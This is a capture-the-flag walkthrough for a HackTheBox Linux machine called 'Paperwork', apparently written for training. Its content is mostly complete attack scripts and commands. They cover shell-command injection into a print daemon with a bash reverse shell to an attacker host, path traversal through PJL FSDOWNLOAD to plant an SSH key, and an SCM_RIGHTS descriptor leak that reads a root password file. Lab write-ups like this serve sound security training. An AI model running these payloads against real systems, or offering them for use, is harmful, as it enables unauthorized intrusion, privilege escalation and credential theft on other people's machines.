Paperwork

Platform: HackTheBox (HTB Season 11 Week #8) Difficulty: Easy OS: Linux LPE SCM_RIGHTS

1. Reconnaissance

Ports Scan

rustscan -a <target-ip> -- -sC -sV -oA nmap-result

Open Ports:

  • 22/tcp – SSH (OpenSSH 10.0p2)
  • 80/tcp – HTTP (nginx 1.28.0)
  • 1515/tcp – ifor-protocol? (Archive_Printer ready)
💡 Info Make sure to register the hostname and adjust your MTU to avoid connection issues: 
echo '<target-ip> paperwork.htb' | sudo tee -a /etc/hosts
sudo ip link set dev tun0 mtu 1300

Enumeration

Reviewing the web page at http://paperwork.htb revealed a downloadable archive file: archive.zip.

wget http://paperwork.htb/download/archive
unzip archive
# server.py

Analyzing server.py, the daemon listens on port 1515 (LPD) and processes print jobs. When a job is received, it extracts the job name from the control file and logs it using subprocess.Popen with shell=True.

subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
🚨 Vulnerability Because shell=True is used, the command string is passed to /bin/sh. The critical step is crafting the Control File (sent after the 0x02 opcode for receiving a control file).

2. Exploitation

Crafting the Payload (exploit.py)

import socket

TARGET = "paperwork.htb"
PORT   = 1515
QUEUE  = "archive_intake" # confirmed from the web page

LHOST = "<attacker-ip>"
LPORT = 4444
payload = f"bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"
job_name = f"x'; {payload} ; echo '"
control_file = f"H kali\nP root\nJ {job_name}\n"
cf_bytes = control_file.encode()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET, PORT))

s.send(b'\x02' + QUEUE.encode() + b'\n')
print("recvjob ack:", s.recv(1024))

cfname = "cfA001kali"
header = b'\x02' + f"{len(cf_bytes)} {cfname}\n".encode()
s.send(header)
print("header ack:", s.recv(1024))

s.send(cf_bytes)
s.send(b'\x00')
print("final:", s.recv(1024))
s.close()

Running the Exploit

Start a listener on your attacker machine:

nc -lnvp 4444

Execute the script:

python3 exploit.py

Gain access as the lp user:

Listening on 0.0.0.0 4444
Connection received on <target-ip> 50920
lp@paperwork:/opt/LPDServer$ id
uid=7(lp) gid=7(lp) groups=7(lp)

3. Post-exploitation

Lateral Movement (lp → archivist)

The lp user has access to the internal network where a JetDirect/PJL service runs on port 9100 (bound to 127.0.0.1). This service, running as archivist, contains a path traversal vulnerability in its file system implementation.

ps -ef | grep jetdirect
# archivi+  987  1  0 05:45 ?  00:00:00 /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 ...
⚠️ Vulnerability The jetdirect.py daemon normalizes paths but fails to strip .. sequences before joining them to the root directory. You can abuse the @PJL FSDOWNLOAD command to write files.

On attacker machine:

Generate an SSH key for the archivist user:

ssh-keygen -t rsa -f id_rsa_archivist

Create the upload script putsshkey.py:

import socket

HOST = '127.0.0.1'
PORT = 9100
TARGET_PATH = "0:../../../home/archivist/.ssh/authorized_keys"

with open('id_rsa_archivist.pub', 'rb') as f:
    pub_key = f.read()

payload = f"@PJL FSDOWNLOAD NAME=\"{TARGET_PATH}\" SIZE={len(pub_key)}\r\n".encode()
payload += pub_key

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.sendall(payload)
s.close()
print("[+] SSH Key injected!")

Start a local HTTP server:

python3 -m http.server

On target machine (as lp):

cd /tmp
wget http://<attacker-ip>:8000/id_rsa_archivist.pub
wget http://<attacker-ip>:8000/putsshkey.py
python3 putsshkey.py
# [+] SSH Key injected!

Back on attacker machine:

ssh -i id_rsa_archivist archivist@paperwork.htb

# Welcome to Ubuntu 25.10...
archivist@paperwork:~$ id
uid=1000(archivist) gid=1000(archivist) groups=1000(archivist)

Privilege Escalation (archivist → root)

Once as archivist, you will find a root-owned daemon (paperwork-daemon) listening on a Unix socket at /run/paperwork/mgmt.sock. This daemon is vulnerable to an SCM_RIGHTS file descriptor leak.

ps -ef | grep paperwork-daemon
# root 1492  1  0 05:45 ?  00:00:00 /usr/bin/python3 /usr/bin/paperwork-daemon
⚠️ Vulnerability The daemon opens /etc/paperwork/admin_pins.conf (readable only by root) at startup. When it detects specific strings (like FSUPLOAD) in the writable log file /home/archivist/printer/logs/commands.log, it sends the file descriptor for the admin config file to the connected client via SCM_RIGHTS.

On target machine (as archivist):

Trigger the condition by appending the string to the log file:

echo "FSUPLOAD" >> /home/archivist/printer/logs/commands.log

Create the leakfd.py script directly on the target machine:

import socket
import array
import os

SOCK_PATH = "/run/paperwork/mgmt.sock"

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(SOCK_PATH)

data, ancillary, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(4096))

for cmsg_level, cmsg_type, cmsg_data in ancillary:
    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
        fds = array.array("i", cmsg_data)
        for fd in fds:
            try:
                content = os.pread(fd, 1024, 0)
                print(f"[+] Leaked FD {fd} content: {content.decode()}")
            except OSError:
                pass
s.close()

Execute the script to leak the password:

python3 leakfd.py

# [+] Leaked FD 5 content: ADMIN_PASSWORD=<password>

Switch to root:

su root
# Enter the leaked password

root@paperwork:~# id
uid=0(root) gid=0(root) groups=0(root)

4. Flag Paths

  • User flag: /home/archivist/user.txt
  • Root flag: /root/root.txt
✅ Lessons Learned This machine requires chaining multiple vulnerabilities: RCE via unsanitized shell=True, path traversal to write an SSH key, and SCM_RIGHTS file descriptor leaking to read a root-owned config file. Always check internal services and Unix sockets!
